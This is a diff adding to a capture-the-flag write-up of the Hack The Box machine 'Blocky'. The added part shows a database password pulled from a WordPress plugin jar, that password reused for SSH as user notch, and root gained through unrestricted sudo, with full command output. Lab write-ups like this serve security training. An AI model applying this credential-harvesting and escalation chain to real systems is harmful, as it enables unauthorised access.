@@ -11,14 +11,10 @@
 - **Objective:** [ ] Capture root flag / administrator access  
 - **Description / Notes:** [Brief overview of the machine, main services, challenges]  
 - **Skills Practiced:** 
-  - [ ] Enumeration
-  - [ ] Web Exploitation
-  - [ ] Binary Exploitation
-  - [ ] Privilege Escalation
-  - [ ] Reverse Engineering
-  - [ ] Pivoting / Networking
-  - [ ] Others: _________
-
+  - [X] Enumeration
+  - [X] Web Exploitation
+  - [X] Exploiting bad password practices
+  - [X] Privilege Escalation
 ---
 
 ## 2. Recon & Enumeration
@@ -208,10 +204,133 @@ Target: http://blocky.htb/
 
 Task Completed
 ```
-2.2 Web Enumeration - The web site was created as wordpress website.
+-----------------------------------------------------------------------------------------------------------------------------------------------
+2.2 Web Enumeration - The web site was created as wordpress website. There is folder called plugin that has some jar files into this , then exactracted
+the content of it.
+```bash
+┌──(sabeshan㉿kali)-[~/HTB/OSCP]
+└─$ cd blocky     
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
+└─$ ls -la
+total 536
+drwxrwxr-x 2 sabeshan sabeshan   4096 Sep  5 14:31 .
+drwxrwxr-x 5 sabeshan sabeshan   4096 Sep  5 14:31 ..
+-rw-rw-r-- 1 sabeshan sabeshan    883 Sep  5 14:27 BlockyCore.jar
+-rw-rw-r-- 1 sabeshan sabeshan 532928 Sep  5 14:27 griefprevention-1.11.2-3.1.1.298.jar
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
+└─$ jar xf BlockyCore.jar 
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
+└─$ ls -la
+total 544
+drwxrwxr-x 4 sabeshan sabeshan   4096 Sep  5 14:31 .
+drwxrwxr-x 5 sabeshan sabeshan   4096 Sep  5 14:31 ..
+-rw-rw-r-- 1 sabeshan sabeshan    883 Sep  5 14:27 BlockyCore.jar
+drwxrwxr-x 3 sabeshan sabeshan   4096 Sep  5 14:31 com
+-rw-rw-r-- 1 sabeshan sabeshan 532928 Sep  5 14:27 griefprevention-1.11.2-3.1.1.298.jar
+drwxrwxr-x 2 sabeshan sabeshan   4096 Sep  5 14:31 META-INF
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
+└─$ cd com           
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky/com]
+└─$ ls -la
+total 12
+drwxrwxr-x 3 sabeshan sabeshan 4096 Sep  5 14:31 .
+drwxrwxr-x 4 sabeshan sabeshan 4096 Sep  5 14:31 ..
+drwxrwxr-x 2 sabeshan sabeshan 4096 Sep  5 14:31 myfirstplugin
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky/com]
+└─$ cd myfirstplugin              
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/…/OSCP/blocky/com/myfirstplugin]
+└─$ ls -la
+total 12
+drwxrwxr-x 2 sabeshan sabeshan 4096 Sep  5 14:31 .
+drwxrwxr-x 3 sabeshan sabeshan 4096 Sep  5 14:31 ..
+-rw-rw-r-- 1 sabeshan sabeshan  939 Jul  2  2017 BlockyCore.class
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/…/OSCP/blocky/com/myfirstplugin]
+└─$ cat BlockyCore.class 
+����4-com/myfirstplugin/BlockyCorejava/lang/ObjectsqlHostLjava/lang/String;sqlUsersqlPass<init>()VCode
+
+
+        localhost
+                       root
+                               8YsqfCTnvxAUeduzjNSXe22
+onServerStart                                          LineNumberTableLocalVariableTablethisLcom/myfirstplugin/BlockyCore;
+             onServerStop
+                         onPlayerJoi"TODO get usernam$!Welcome to the BlockyCraft!!!!!!!
+&
+ '(
+   sendMessage'(Ljava/lang/String;Ljava/lang/String;)usernamemessage
+SourceFileBlockyCore.java!
+
+Q*�
+   *�*�*�▒�▒
 
 
 
+▒
+
+
+
+▒
+
+
+7       *!#�%�▒
+ 
+        (
+         ?�▒)*+,                                                                                                                                                             
+```
+notch:8YsqfCTnvxAUeduzjNSXe22 here some creds was obatained i tried these creds for ssh login
+The user is notch
+--------------------------------------------------------------------------------------------------------------------------
+I got the ssh connection for the user and tried this to escalate to the root.
+```bash
+┌──(sabeshan㉿kali)-[~/…/OSCP/blocky/com/myfirstplugin]
+└─$ ssh notch@blocky.htb        
+The authenticity of host 'blocky.htb (10.10.10.37)' can't be established.
+ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'blocky.htb' (ED25519) to the list of known hosts.
+notch@blocky.htb's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+notch@Blocky:~$ 
+```
+----------------------------------------------------------------------------------------------------------------------------
+
+Now I can try 'sudo -l' this allows all and i can escalate the root easily.
+```bash
+
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+notch@Blocky:~$ sudo -i
+root@Blocky:~# 
+```
+-------------------------------------------------------------------------------------------------------------------------------
+The machine was rooted.
 
 
 
